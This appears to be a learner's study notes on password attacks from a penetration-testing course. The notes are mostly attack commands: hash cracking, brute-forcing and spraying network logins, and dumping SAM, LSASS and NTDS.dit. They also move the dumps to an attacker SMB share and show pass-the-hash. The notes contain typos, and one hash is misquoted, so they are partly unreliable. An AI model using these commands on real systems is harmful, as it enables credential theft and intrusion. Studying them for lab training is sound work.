
# Password Cracking Techniques
## Introduction to Password Cracking


```shell-session
echo -n Soccer06! | md5sum
40291c1d19ee11a7df8495c4cccefdfa  -

echo -n Soccer06! | sha256sum
a025dc6fabb09c2b8bfe23b5944635f9b68433ebd9a1a09453dd4fee00766d93  -
```

```
echo -n Academy#2025 | sha1sum
```

## Cracking modes


an  Rainbow tables is hashes of know passwords that can be used in dicrtnary attacks to crack the hash

A `brute-force` attack involves attempting every possible combination of letters, numbers, and symbols until the correct password is discovered. Obviously, this can take a very long time—especially for long passwords—however shorter passwords (<9 characters) are viable targets, even on consumer hardware.


A `dictionary` attack, otherwise known as a `wordlist` attack, is one of the most `efficient` techniques for cracking passwords, especially when operating under time-constraints as penetration testers usually do. Rather than attempting every possible combination of characters, a list containing statistically likely passwords is used. Well-known wordlists for password cracking are [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) and those included in



**"Single crack mode" is fast and effective because it focuses on cracking one user's password at a time by using their own personal information (like username and real name) against them.** It's often the first thing you should try because it finds the "easy" passwords very quickly.


```shell-session
john --single passwd
```
`crack using the single crack mode`


```shell-session
john --wordlist=<wordlist_file> <hash_file>
```
`wordlist attack`


```shell-session
john --incremental <hash_file>
```
`Brute-force using the tarning data and it is time consuming`

## Identifying hash formats


```shell-session
hashid -j 193069ceb0461e1d40d216e32c79c704
```

## Cracking files

It is also possible to crack password-protected or encrypted files with JtR. Multiple `"2john"` tools

```shell-session
<tool> <file_to_crack> > file.hash
```


| **Tool**                | **Description**                               |
| ----------------------- | --------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |


```shell-session
locate *2john*
```
`TO find all the john tools`


## Into TO Hashcat

```shell-session
hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```

```shell-session
hashcat --help
```
`TO see all the hashtypes and modes`

```shell-session
ls -l /usr/share/hashcat/rules
```
`TO list all the rules`

```shell-session
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
`to apply the rules`


| Symbol | Charset                             |
| ------ | ----------------------------------- |
| ?l     | abcdefghijklmnopqrstuvwxyz          |
| ?u     | ABCDEFGHIJKLMNOPQRSTUVWXYZ          |
| ?d     | 0123456789                          |
| ?h     | 0123456789abcdef                    |
| ?H     | 0123456789ABCDEF                    |
| ?s     | «space»!"#$%&'()*+,-./:;<=>?@[]^_`{ |
| ?a     | ?l?u?d?s                            |
| ?b     | 0x00 - 0xff                         |

```shell-session
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

## Custom Wordlist

```shell-session
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```


```shell-session
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

Creating Python cusstom wordlist


## Cracking Protected Files

```shell-session
for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
`Hunting for Encrypted Files`


```shell-session
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
```
`Hunting for SSH keys`


```shell-session
ssh-keygen -yf ~/.ssh/id_ed25519
```
`reading the key with ssh-keygen if encrypted it will promt the user for an passphrase` 


```shell-session
locate *2john*
```


```shell-session
ssh2john.py SSH.private > ssh.hash
```
`Cracking SSH Private Key`
```shell-session
john --wordlist=rockyou.txt ssh.hash
```
`THis will decrypt the hash`
```shell-session
john ssh.hash --show
```


```shell-session
 office2john.py Protected.docx > protected-docx.hash
```
` Cracking password-protected documents`
```shell-session
john --wordlist=rockyou.txt protected-docx.hash
```
```shell-session
john protected-docx.hash --show
```

```shell-session
pdf2john.py PDF.pdf > pdf.hash
```
`Cracking PDF files`
```shell-session
john --wordlist=rockyou.txt pdf.hash
```
```shell-session
john --wordlist=rockyou.txt pdf.hash
```



```shell-session
zip2john ZIP.zip > zip.hash
```
`## Cracking ZIP files`
```shell-session
john --wordlist=rockyou.txt zip.hash
```
```shell-session
john zip.hash --show
```

```shell-session
for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
```
`## Cracking OpenSSL encrypted GZIP files`


### BitLoker VHD

```shell-session
bitlocker2john -i Backup.vhd > backup.hashes
```
`## Cracking BitLocker-encrypted drives`
```shell-session
grep "bitlocker\$0" backup.hashes > backup.hash
```
```shell-session
hashcat -a 0 -m 22100 '$bitlocker$0$16$02b329c0453b9273f2fc1b927443b5fe$1048576$12$00b0a67f961dd80103000000$60$d59f37e70696f7eab6b8f95ae93bd53f3f7067d5e33c0394b3d8e2d1fdb885cb86c1b978f6cc12ed26de0889cd2196b0510bbcd2a8c89187ba8ec54f' /usr/share/wordlists/rockyou.txt
```


```shell-session
sudo apt-get install dislocker
```
`TOol to acces the Bitloker drive`

```shell-session
sudo mkdir -p /media/bitlockermount
```
```shell-session
sudo mkdir -p /media/bitlocker
```


```
sudo losetup -f -P Backup.vhd
```
```
sudo losetup -a
```
```
ls -l /dev/loop0*
```
```
sudo dislocker /dev/loop0p2 -u1234qwer -- /media/bitlocker
```
```shell-session
sudo mount -o loop /media/bitlocker/dislocker-file /media/bitlockermount
```

```shell-session
cd /media/bitlockermount/
ls -la
```


```shell-session
sudo umount /media/bitlockermount
sudo umount /media/bitlocker
```

# Remote Password Attacks

## Network Services
### WinRM

[Windows Remote Management](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) (`WinRM`) is the Microsoft implementation of the [Web Services Management Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) (`WS-Management`). It is a network protocol based on XML web services using the [Simple Object Access Protocol](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) (`SOAP`) used for remote management of Windows systems. It takes care of the communication between [Web-Based Enterprise Management](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) (`WBEM`) and the [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (`WMI`), which can call the [Distributed Component Object Model](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) (`DCOM`).

```shell-session
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
`The general format for using NetExec`

```shell-session
netexec winrm 10.129.42.197 -u user.list -p password.list
```

```shell-session
sudo gem install evil-winrm
```

```shell-session
evil-winrm -i <target-IP> -u <username> -p <password>
```
`Evil-winrm with username and password`

### SSH

[Secure Shell](https://www.ssh.com/academy/ssh/protocol) (`SSH`) is a more secure way to connect to a remote host to execute system commands or transfer files from a host to a server. The SSH server runs on `TCP port 22` by defau

```shell-session
hydra -L user.list -P password.list ssh://10.129.42.197
```
`Hydra to brute force ssh`


### Remote Desktop Protocol (RDP)

```shell-session
hydra -L user.list -P password.list rdp://10.129.42.197
```
`Hydra to bruteforce RDP`

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```
`Xfreerdp to use`


### SMB

```shell-session
hydra -L user.list -P password.list smb://10.129.42.197
```
`Hyfra to bruute smb`

```shell-session
use auxiliary/scanner/smb/smb_login
```
`Metasploit to brute smb`

```shell-session
netexec smb 10.129.42.197 -u "user" -p "password" --shares
```
`Netexec to communicate with smb`

## Spraying, Stuffing, and Defaults


### Password spraying

[Password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack) is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts.

```shell-session
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```
`Password Sparing using NetExec`


### Credential stuffing

[Credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing) is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others


```shell-session
hydra -C user_pass.list ssh://10.100.38.23
```
`Hydra for Cred Stffing`


### Default credentials

```shell-session
pip3 install defaultcreds-cheat-sheet
```

```shell-session
AntivenomisCrazy@htb[/htb]$ creds search linksys

+---------------+---------------+------------+
| Product       |    username   |  password  |
+---------------+---------------+------------+
| linksys       |    <blank>    |  <blank>   |
| linksys       |    <blank>    |   admin    |
| linksys       |    <blank>    | epicrouter |
| linksys       | Administrator |   admin    |
| linksys       |     admin     |  <blank>   |
| linksys       |     admin     |   admin    |
| linksys       |    comcast    |    1234    |
| linksys       |      root     |  orion99   |
| linksys       |      user     |  tivonpw   |
| linksys (ssh) |     admin     |   admin    |
| linksys (ssh) |     admin     |  password  |
| linksys (ssh) |    linksys    |  <blank>   |
| linksys (ssh) |      root     |   admin    |
+---------------+---------------+------------+
```
`Search the Specific Vendor`


Ruoters Default creds list is [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/)


# Extracting Passwords from Windows Systems

## Windows Authentication Process


The [Windows client authentication process](https://docs.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication) involves multiple modules responsible for logon, credential retrieval, and verification. Among the various authentication mechanisms in Windows, Kerberos is one of the most widely used and complex. The [Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection) (`LSA`) is a protected subsystem that authenticates users, manages local logins, oversees all aspects of local security, and provides services for translating between user names and security identifiers (SIDs).

the LSA subsystem provides services for access control, permission checks, and the generation of security audit messages.


![[../../attchments/Pasted image 20251028133137.png]]

#### LSASS

The [Local Security Authority Subsystem Service](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) (`LSASS`) is comprised of multiple modules and governs all authentication processes. Located at `%SystemRoot%\System32\Lsass.exe`in the file system, it is responsible for enforcing the local security policy, authenticating users, and forwarding security audit logs to the `Event Log`. In essence, LSASS serves as the gatekeeper in Windows-based operating systems.


Windows systems can be assigned to either a workgroup or domain during setup. If the system has been assigned to a workgroup, it handles the SAM database locally and stores all existing users locally in this database. However, if the system has been joined to a domain, the Domain Controller (`DC`) must validate the credentials from the Active Directory database (`ntds.dit`), which is stored in `%SystemRoot%\ntds.dit`.


To improve protection against offline cracking of the SAM database, Microsoft introduced a feature in Windows NT 4.0 called `SYSKEY` (`syskey.exe`). When enabled, SYSKEY partially encrypts the SAM file on disk, ensuring that password hashes for all local accounts are encrypted with a system-generated key.

```powershell-session
PS C:\Users\[Username]\AppData\Local\Microsoft\[Vault/Credentials]\
```
`Crediantial managers storage location`


#### NTDS

`NTDS.dit` is a database file that stores Active Directory data, including but not limited to:

- User accounts (username & password hash)
- Group accounts
- Computer accounts
- Group policy objects

## Attacking SAM, SYSTEM, and SECURITY


### Registry hives

|Registry Hive|Description|
|---|---|
|`HKLM\SAM`|Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.|
|`HKLM\SYSTEM`|Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.|
|`HKLM\SECURITY`|Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more|

```cmd-session
reg.exe save hklm\sam C:\sam.save
```
```cmd-session
 reg.exe save hklm\security C:\security.save
```
```cmd-session
reg.exe save hklm\system C:\system.save
```
`cmd.exe with Admin Priv to run reg.exe to dave copies`


```shell-session
sudo python3 smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
`Staring smbsever transfer SAM and System`


```cmd-session
move sam.save \\10.10.15.16\CompData
```
```cmd-session
move system.save \\10.10.15.16\CompData
```
```cmd-session
move security.save \\10.10.15.16\CompData
```
`Tranfer files to smbserver`


### Dumping hashes with secretsdump

```shell-session
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
`secretsdump.py with SAM and SYSTEM file`



### Cracking hashes with Hashcat

```shell-session
sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
`Cracking NThashes with Hashcat`

```
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
jason:1002:aad3b435b51404eeaad3b435b51404ee:a3ecf31e65208382e23b3420a34208fc:::
ITbackdoor:1003:aad3b435b51404eeaad3b435b51404ee:c02478537b9727d391bc80011c2e2321:::
frontdesk:1004:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
```
`If this is how the dump looks like then the NT hash is 02478537b9727d391bc80011c2e2321 `

```shell-session
hashcat -m 2100 '$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25' /usr/share/wordlists/rockyou.txt
```
`Cracking DC2 hashes using Hashcat`


### DPAPI

In addition to the DCC2 hashes, we previously saw that the `machine and user keys` for `DPAPI` were also dumped from `hklm\security`. The Data Protection Application Programming Interface, or [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection), is a set of APIs in Windows operating systems used to encrypt and decrypt data blobs on a per-user basis. These blobs are utilized by various Windows OS features and third-party applications. Below are just a few examples of applications that use DPAPI and how they use it:

| Applications                | Use of DPAPI                                                                                |
| --------------------------- | ------------------------------------------------------------------------------------------- |
| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |
| `Outlook`                   | Passwords for email accounts.                                                               |
| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |
| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |

DPAPI encrypted credentials can be decrypted manually with tools like Impacket's [dpapi](https://github.com/fortra/impacket/blob/master/examples/dpapi.py), [mimikatz](https://github.com/gentilkiwi/mimikatz), or remotely with [DonPAPI](https://github.com/login-securite/DonPAPI).


```cmd-session
mimikatz.exe
```
```cmd-session
dpapi::chrome /in:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```
`Cracking DPAPI like Chrome Saved Passwords etc`


### Remote dumping & LSA secrets

```shell-session
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
`Remote dumping & LSA secrets using Netexec`

```shell-session
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
`Dumping SAM Remotely using netexec`


## Attacking LSASS

LSASS is a core Windows process responsible for enforcing security policies, handling user authentication, and storing sensitive credential material in memory.

### Dumping LSASS process memory

![[../../attchments/Pasted image 20251028180718.png]]
`Task manager method`

A file called `lsass.DMP` is created and saved in `%temp%`. This is the file we will transfer to our attack host

#### Rundll32 for Dumping LSASS Process memory

```cmd-session
tasklist /svc
```
`Finding THe PID of LSASS CMD`

```powershell-session
Get-Process lsass
```
`Finding The PID of LSASS Powershell`

```powershell-session
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
`Creating a dump file using PowerShell`

#### pypykatz

```shell-session
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
`Using pypykatz to underatnd the contnt of lsass.dmp`

[MSV](https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package) is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database

`WDIGEST` is an older authentication protocol enabled by default in `Windows XP` - `Windows 8` and `Windows Server 2003` - `Windows Server 2012`. LSASS caches credentials used by WDIGEST in clear-text


[[https://web.mit.edu/kerberos/#what_is]] is a network authentication protocol used by Active Directory in Windows Domain environments. Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time. LSASS caches `passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.


```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
`Cracking the NT Hash with Hashcat`


## Attacking Windows Credential Manager

![[../../attchments/Pasted image 20251028204036.png]]

```cmd-session
rundll32 keymgr.dll,KRShowKeyMgr
```
```cmd-session

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```
`Enumerating credentials with cmdkey`

```cmd-session
runas /savecred /user:SRV01\mcharles cmd
```
`use runas to impersonate the stored user`


```cmd-session
mimikatz.exe
```
```cmd-session
privilege::debug
```
```cmd-session
sekurlsa::credman
```
`Extracting credentials with Mimikatz`


## Attacking Active Directory and NTDS.dit

In this section, we will focus primarily on how we can extract credentials through the use of a `dictionary attack` against `AD accounts` and `dumping hashes` from the `NTDS.dit` file.



Once a Windows system is joined to a domain, it will `no longer default to referencing the SAM database to validate logon requests`. That domain-joined system will now send authentication requests to be validated by the domain controller before allowing a user to log on. This does not mean the SAM database can no longer be used. Someone looking to log on using a local account in the SAM database can still do so by specifying the `hostname` of the device proceeded by the `Username` (Example: `WS01\nameofuser`)


### Dictionary attacks against AD accounts using NetExec


```shell-session
./username-anarchy -i /home/ltnbob/names.txt
```
`THis will convert normal usernames to AD usernames `


```shell-session
./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
```

	
```shell-session
netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```


### Capturing NTDS.dit

`NT Directory Services` (`NTDS`) is the directory service used with AD to find & organize network resources. Recall that `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html). This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information. If this file can be captured, we could potentially compromise every account on the domain


```shell-session
evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```
`Conneting to DC with evil-wirm`


```shell-session
net localgroup
```
`We are looking to see if the account has local admin rights. To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights. We also will want to check what domain privileges we have.`



```shell-session
net user bwilliamson
```
`Checking user account privileges including domain`


#### Creating shadow copy of C:

We can use `vssadmin` to create a [Volume Shadow Copy](https://docs.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) (`VSS`) of the `C:` drive or whatever volume the admin chose when initially installing AD.

```shell-session
vssadmin CREATE SHADOW /For=C:
```
`Creating an Shadow Copy`


```shell-session
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```
`Copying the NTDS.dit to another location on c drive`

```shell-session
cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```
`Moving the NTDS.dit to Attck host`


```shell-session
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
`Extracting hashes from NTDS.dit using Secteresdump`


#### Netexec NDTS.dit

```shell-session
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```


```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```
`Cracking the NT hash`


#### Pass the Hash (PtH) with Evil-WinRM Example

```shell-session
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

## Credential Hunting in Windows

### Key terms to search for
- Passwords
- Passphrases
- Keys
- Username
- User account
- Creds
- Users
- Passkeys
- configuration
- dbcredential
- dbpassword
- pwd
- Login
- Credentials


[laZagne.exe](https://github.com/AlessandroZ/LaZagne/releases/) used for Credential hunting

```cmd-session
start LaZagne.exe all
```
`Used evryitng to Search for credential`


```cmd-session
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
`Findstr to find files `



Here are some other places we should keep in mind when credential hunting:

- Passwords in Group Policy in the SYSVOL share
- Passwords in scripts in the SYSVOL share
- Password in scripts on IT shares
- Passwords in `web.config` files on dev machines and IT shares
- Password in `unattend.xml`
- Passwords in the AD user or computer description fields
- KeePass databases (if we are able to guess or crack the master password)
- Found on user systems and shares
- Files with names like `pass.txt`, `passwords.docx`, `passwords.xlsx` found on user systems, shares, and [Sharepoint](https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration)


# Extracting Passwords from Linux Systems
## Authentication Process in Linux


### Passwd file


```shell-session
AntivenomisCrazy@htb[/htb]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash
```
	`IF i don't see the x in front fo the user `

### Shadow File

If the `Password` field contains a character such as `!` or `*`, the user cannot log in using a Unix password. However, other authentication methods—such as Kerberos or key-based authentication—can still be used. The same applies if the `Password` field is empty, meaning no password is required for login. This can lead to certain programs denying access to specific functions. The `Password` field also follows a particular format, from which we can extract additional information:

- `$<id>$<salt>$<hashed>`


| ID     | Cryptographic Hash Algorithm                                          |
| ------ | --------------------------------------------------------------------- |
| `1`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
| `2a`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
| `5`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
| `6`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
| `sha1` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
| `y`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
| `gy`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
| `7`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |

### Opasswd

old passwords. These previous passwords are stored in the `/etc/security/opasswd` file

### Cracking Linux Credentials


```shell-session
sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
```
```shell-session
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```


## Credential hunting linux


- `Files` including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
- `History` including logs, and command-line history
- `Memory` including cache, and in-memory processing
- `Key-rings` such as browser stored credentials

### Files

```shell-session
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
`Searching for configuration files`


```shell-session
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
`Looking for words like pass,password etc in the .cnf files`


```shell-session
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
`Searhing for Databases`



```shell-session
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
`Searching for Notes`

```shell-session
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
`Searching for Scripts`

```
cat /etc/cron.d/
cat /etc/crontab
```
`Enumarating Crons`


```shell-session
tail -n5 /home/*/.bash*
```
` Enumerating history files`


#### Log Files

|**File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|


```shell-session
for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
```
`To find Intresting Content in the logs`


### Memory and cache

[mimipenguin](https://github.com/huntergregal/mimipenguin) THis tool Requires root permissions

```shell-session
sudo python3 mimipenguin.py
```

[LaZagne](https://github.com/AlessandroZ/LaZagne) 

```shell-session
sudo python2.7 laZagne.py all
```

#### Browser Cresds

```shell-session
ls -l .mozilla/firefox/ | grep default
```
`Browser creds`

```shell-session
cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
```


The tool [Firefox Decrypt](https://github.com/unode/firefox_decrypt) is excellent for decrypting these credentials,


```shell-session
python3.9 firefox_decrypt.py
```


```shell-session
python3 laZagne.py browsers
```


# Extracting Passwords from the Network
## Credential huntinng in Network Traffic


|Unencrypted Protocol|Encrypted Counterpart|Description|
|---|---|---|
|`HTTP`|`HTTPS`|Used for transferring web pages and resources over the internet.|
|`FTP`|`FTPS/SFTP`|Used for transferring files between a client and a server.|
|`SNMP`|`SNMPv3 (with encryption)`|Used for monitoring and managing network devices like routers and switches.|
|`POP3`|`POP3S`|Retrieves emails from a mail server to a local client.|
|`IMAP`|`IMAPS`|Accesses and manages email messages directly on the mail server.|
|`SMTP`|`SMTPS`|Sends email messages from client to server or between mail servers.|
|`LDAP`|`LDAPS`|Queries and modifies directory services like user credentials and roles.|
|`RDP`|`RDP (with TLS)`|Provides remote desktop access to Windows systems.|
|`DNS (Traditional)`|`DNS over HTTPS (DoH)`|Resolves domain names into IP addresses.|
|`SMB`|`SMB over TLS (SMB 3.0)`|Shares files, printers, and other resources over a network.|
|`VNC`|`VNC with TLS/SSL`|Allows graphical remote control of another computer.|


|Wireshark filter|Description|
|---|---|
|`ip.addr == 56.48.210.13`|Filters packets with a specific IP address|
|`tcp.port == 80`|Filters packets by port (HTTP in this case).|
|`http`|Filters for HTTP traffic.|
|`dns`|Filters DNS traffic, which is useful to monitor domain name resolution.|
|`tcp.flags.syn == 1 && tcp.flags.ack == 0`|Filters SYN packets (used in TCP handshakes), useful for detecting scanning or connection attempts.|
|`icmp`|Filters ICMP packets (used for Ping), which can be useful for reconnaissance or network issues.|
|`http.request.method == "POST"`|Filters for HTTP POST requests. In the case that POST requests are sent over unencrypted HTTP, it may be the case that passwords or other sensitive information is contained within.|
|`tcp.stream eq 53`|Filters for a specific TCP stream. Helps track a conversation between two hosts.|
|`eth.addr == 00:11:22:33:44:55`|Filters packets from/to a specific MAC address.|
|`ip.src == 192.168.24.3 && ip.dst == 56.48.210.3`|Filters traffic between two specific IP addresses. Helps track communication between specific hosts.|


```shell-session
./Pcredz -f demo.pcapng -t -v
```


## Credential Hunting In Network Shares

### Hunting form Wiindows

#### Snaffler

The first tool we will cover is [Snaffler](https://github.com/SnaffCon/Snaffler). This is a C# program that, when run on a `domain-joined` machine, automatically identifies accessible network shares and searches for interesting files

- `-u` retrieves a list of users from Active Directory and searches for references to them in files
- `-i` and `-n` allow you to specify which shares should be included in the search


```cmd-session
Snaffler.exe -s
```



#### PowerHuntShares

Another tool that can be used is [PowerHuntShares](https://github.com/NetSPI/PowerHuntShares), a PowerShell script that doesn't necessarily need to be run on a domain-joined machine. One of its most useful features is that it generates an `HTML report` upon completion, providing an easy-to-use UI for reviewing the results:

```powershell-session
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

### Hunting from Linux

tools like [MANSPIDER](https://github.com/blacklanternsecurity/MANSPIDER) allow us to scan SMB shares from Linux. It's best to run `MANSPIDER` using the official Docker container


```shell-session
docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider 10.129.234.121 -c 'passw' -u 'mendres' -p 'Inlanefreight2025!'
```


```shell-session
nxc smb 10.129.234.121 -u mendres -p 'Inlanefreight2025!' --spider IT --content --pattern "passw"
```
`To Search for Pass word in Shared Using Netexec`

```
nxc smb 10.129.234.173 -u megadre -p 'planefreight2023!' -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```
`This will downlaod the content in tmp dir`
```
grep -ri 'passw'
```
`To search recursivly`




# Windows Lateral Movement Techniques

A [[PtH)](PtH|Pass the Hash (PtH)]]) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password


## Pass the Hash 


### Pass the Hash with Mimikatz (Windows)


```cmd-session
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```
`Pass the hash using mimi`

- `/user` - The user name we want to impersonate.
- `/rc4` or `/NTLM` - NTLM hash of the user's password.
- `/domain` - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).
- `/run` - The program we want to run with the user's context (if not specified, it will launch cmd.exe).


